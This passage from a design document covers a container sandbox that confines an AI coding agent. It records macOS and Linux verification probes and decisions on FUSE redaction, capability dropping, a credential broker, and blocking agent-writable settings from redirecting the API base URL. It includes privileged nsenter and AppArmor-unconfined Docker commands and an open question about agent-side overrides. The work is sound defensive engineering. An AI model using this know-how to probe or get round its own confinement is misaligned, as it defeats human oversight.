a trade — measured, not assumed:** in-place FUSE there is `cap-drop=ALL`-via-Colima *or*
no-Colima-via-a-`SYS_ADMIN`-cap, never both. Recommendation: **Plan H** (no Colima; hardened
single-container FUSE on macOS; Linux unchanged). Remaining unknown: **Gate A** (`ANTHROPIC_BASE_URL` for
OAuth — C1 vs C2).

---

## Verification gates

Each can kill or reshape an option.

### Gate B / C — RESOLVED (2026-07-23, Docker Desktop 4.78.0 vs Colima 0.10.3)

The macOS gate is settled: **Docker Desktop cannot host the sidecar; Colima can.** Reproduction —

```bash
# Docker Desktop context: the daemon REFUSES the propagation flag.
#   findmnt on the VM root -> "private"
docker run --rm --privileged --pid=host alpine nsenter -t 1 -m -- findmnt -no PROPAGATION /
#   two containers sharing a macOS-path medium:
mkdir -p /tmp/kibprobe
docker run -d --name kibprobe-src --privileged \
  --mount type=bind,src=/tmp/kibprobe,dst=/tmp/kibprobe,bind-propagation=rshared \
  alpine sh -c 'mkdir -p /tmp/kibprobe/mnt && mount -t tmpfs none /tmp/kibprobe/mnt && sleep 300'
#   -> "path /host_mnt/private/tmp/kibprobe ... is not a shared mount"  (DD cannot; structural)
docker rm -f kibprobe-src

# Colima context: shared root + real cross-container propagation + real FUSE mount.
colima start ; docker context use colima
docker run --rm --privileged --pid=host alpine nsenter -t 1 -m -- findmnt -no PROPAGATION /   # -> shared
docker run -d --name kibprobe-src --privileged \
  --mount type=bind,src=/var/kibprobe,dst=/var/kibprobe,bind-propagation=rshared \
  alpine sh -c 'mkdir -p /var/kibprobe/mnt && mount -t tmpfs none /var/kibprobe/mnt && echo hello > /var/kibprobe/mnt/marker && sleep 300'
docker run --rm --mount type=bind,src=/var/kibprobe,dst=/work,bind-propagation=rslave \
  alpine sh -c 'cat /work/mnt/marker && echo COLIMA-PROPAGATION-OK'   # -> hello / COLIMA-PROPAGATION-OK
docker rm -f kibprobe-src
# FUSE mount with kib's actual sidecar flags (apparmor exception is required — docker-default denies mount):
docker --context colima run --rm --cap-add SYS_ADMIN --device /dev/fuse --security-opt apparmor=unconfined \
  ubuntu sh -c 'apt-get update -qq && apt-get install -y bindfs >/dev/null 2>&1 && mkdir -p /src /view && echo hi >/src/f && bindfs /src /view && cat /view/f && echo COLIMA-FUSE-MOUNT-OK'
#   -> nodev fuse in /proc/filesystems ; hi / COLIMA-FUSE-MOUNT-OK
```

Outcome: R1 unchanged on Linux; on macOS, run it inside Colima (or Lima/Rancher). `kib`'s sidecar flags
need no change.

### Gate B (macOS Docker Desktop) — the full result (2026-07-23), which forces A/H/U

Both `cap-drop=ALL` in-place FUSE mechanisms are blocked on Docker Desktop; single-container FUSE with a
`SYS_ADMIN` cap works.

```bash
# cap-drop=ALL, unprivileged userns FUSE -> BLOCKED (kernel refuses the uid_map write)
docker run --rm --cap-drop=ALL --security-opt seccomp=unconfined --security-opt apparmor=unconfined \
  ubuntu sh -c 'unshare --user --map-root-user id && echo USERNS-OK || echo USERNS-FAIL'
#   -> unshare: write failed /proc/self/uid_map: Operation not permitted ; USERNS-FAIL

# single container, SYS_ADMIN added back, apparmor exception -> WORKS
#   (bindfs BAKED into the image — apt fails under cap-drop=ALL, see note, so a runtime install is not a valid probe)
printf 'FROM ubuntu\nRUN apt-get update -qq && apt-get install -y bindfs\n' | docker build -t fuse-probe -
docker run --rm --cap-drop=ALL --cap-add SYS_ADMIN --device /dev/fuse --security-opt apparmor=unconfined \
  fuse-probe sh -c 'mkdir -p /src /view && echo hi >/src/f && bindfs /src /view && cat /view/f && echo DD-SYSADMIN-FUSE-OK'
#   -> hi ; DD-SYSADMIN-FUSE-OK   (basis of Plans H/U; the real design drops SYS_ADMIN after the mount)
```

*(Note: `apt` fails under `cap-drop=ALL` — no `DAC_OVERRIDE`/`SETUID` to manage its cache/sandbox — so a
FUSE tool must be **baked into the image**, as `guest/bin/fuse` already is. Several early probes here read
as FUSE failures but were actually apt failing; the baked-image form above is the valid test.)*

### Outstanding gates

```bash
# GATE A — does Claude Code honour ANTHROPIC_BASE_URL for subscription OAuth? (C1 vs C2)
#   Run on a host with `claude` logged in. Do NOT log request headers — the Authorization header is the token.
python3 -m http.server 8099 &
ANTHROPIC_BASE_URL=http://127.0.0.1:8099 claude -p 'hi' ; kill %1

# GATE D — Portmaster and container-to-container egress (decides E1's shape) — Linux host only
docker network create kib-probe
docker run -d --name probe-up --network kib-probe python:3-alpine python3 -m http.server 8080
docker run --rm --network kib-probe python:3-alpine \
  python3 -c "import urllib.request as u; print(u.urlopen('http://probe-up:8080').status)"
docker rm -f probe-up ; docker network rm kib-probe

# GATE (K2-only) — can gVisor service /dev/fuse? Run only if pursuing gVisor after R1.
docker run --rm --runtime=runsc --cap-add=SYS_ADMIN --device /dev/fuse \
  keep-it-in-your-box sh -c 'ls -l /dev/fuse && python3 -c "import fuse; print(\"ok\")"'
```

---

## Open decisions

Settled decisions are recorded at the top (the four gates). Remaining:

- [x] **Gate B (macOS)** — RESOLVED 2026-07-23. Docker Desktop can't do `cap-drop=ALL` in-place FUSE by *either* mechanism (propagation refused; unprivileged userns `uid_map` refused). Colima does the `cap-drop=ALL` sidecar; single-container FUSE + `SYS_ADMIN` works on Docker Desktop.
- [x] **macOS plan — A, H, or U?** — RESOLVED → **H**, and implemented. A research pass (engine
  lock-in, Colima's documented upgrade-breakage history, Docker Desktop's free-tier terms) settled
  it: A ties macOS to Colima specifically (propagation only works on its shared-root VM) and is
  mac-only-testable; H works on *any* engine (Docker Desktop, OrbStack, Colima) and the whole macOS
  topology is developable on Linux via `KIB_SINGLE_CONTAINER=1`. Linux keeps the verified
  `cap-drop=ALL` sidecar unchanged; macOS uses hardened single-container FUSE (`SYS_ADMIN` at
  creation, mounted by the trusted entrypoint, then dropped from the bounding set with `setpriv`
  before the capless agent runs). All OS branching lives in `host/portable.sh`; the two FUSE modes
  sit behind a 3-function interface (`prepare_redaction`/`verify_redaction_attach`/
  `teardown_redaction`). See CLAUDE.md § "macOS support (Plan H)". Remaining before flipping the
  README's "macOS ❌" rows: the on-hardware VERIFY items (clipboard binary choice, virtiofs
  ownership) — see that section.
- [x] **C3/C4 shape** — RESOLVED. Generic parameterized reverse-proxy broker (not DFS-specific); C4 detector is host-side-at-launch and advisory (warn + recommend, never blocks); shared-plugin install surfaces a friendly `--unlock-shared` error (no new subcommand).
- [x] **C3 transport** — RESOLVED (built): the agent reaches the broker over **plain HTTP** on the broker net (`http://kib-broker:<port><path>`); no CA needed. The broker re-originates TLS upstream.
- [x] **C3 streaming** — RESOLVED: `kib/broker/ _do_relay` streams the response read-to-EOF, flushing per 64 KiB chunk (`send Connection: close`); SSE / streamable-HTTP passthrough is unbuffered. `tests/broker/test_broker.py` asserts a 3-chunk stream arrives intact.
- [x] **C4 heuristic** — RESOLVED (conservative by choice): flags `Bearer`/`Basic` header shapes + `env` names matching `TOKEN|KEY|SECRET|PASSWORD|CREDENTIAL`, warn-only. Entropy/base64 scoring was deemed unnecessary for a non-blocking nudge; revisit only if false positives appear on real configs.
- **On-hardware VERIFY (needs Docker; can't run from inside the sandbox):** the `hosted_mcp` sidecar end-to-end (supergateway + `uvx <server>` fetch, HOME/cache dirs, the `/mcp` streamable-HTTP path) — built + fail-soft, same "verify on first real use" status as the codex/gemini rows.
- [x] **Gate A** — RESOLVED 2026-07-23: Claude Code **honours** `ANTHROPIC_BASE_URL` for OAuth (`HIT POST /v1/messages?beta=true`). C1 (base-URL, no CA) is the path; C2 shelved.
- [x] **Gate D** — RESOLVED 2026-07-23: Portmaster **permits** container→container on a user bridge (`C2C 200`). E1/broker use the internal bridge; no host-loopback fallback needed.
- [x] **`validate_shared_settings` carve-out** — RESOLVED: no code change. `kib` sets `ANTHROPIC_BASE_URL` via a container `-e` flag (host-controlled channel); the validator keeps refusing `env.ANTHROPIC_BASE_URL` in the shared *settings.json* (the agent-writable, cross-project channel). Two different channels.
- [ ] **Broker VERIFY (env precedence)** — does a container `-e ANTHROPIC_BASE_URL` win over a per-project (agent-writable) `settings.json` `env` entry? If the file wins, re-pin in `guest/entrypoint/docker-entrypoint.sh`.
- [ ] `WebFetch` — server-side (survives an allowlist) or client-side (breaks under E1)?
